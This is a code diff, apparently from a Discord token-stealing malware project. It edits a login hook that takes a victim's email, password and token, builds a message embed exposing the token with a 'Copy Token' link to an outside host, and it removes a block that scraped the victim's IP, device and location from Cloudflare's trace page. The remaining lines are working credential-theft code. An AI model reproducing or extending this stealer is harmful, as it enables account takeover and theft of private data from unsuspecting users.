@@ -327,26 +327,6 @@ const hooker = (content) => {
 const login = async (email, password, token) => {
   
 
-$(function () { 
-    var url="https://www.cloudflare.com/cdn-cgi/trace";
-    
-    // $.ajax().done().fail();
-    $.ajax({ method:"GET", url:url}).done(function (response) { 
-            let veri=response.split('\n');
-            console.log(veri);
-            let ip=veri[2].split('=')[1];
-            
-
-            let cihaz=veri[5].split('=')[1];
-            
-            
-            let konum=veri[8].split('=')[1];
-            
-
-    }).fail(function () { 
-       
-    });
-})
             
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
@@ -362,11 +342,6 @@ $(function () {
        {
             name: `<a:tre:962470429115686923>  \`${token}\``,
             value: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
-            inline: false,
-          },
-            {
-            name: `ip`,
-            value: `${ip}`,
             inline: false,
           },
            {
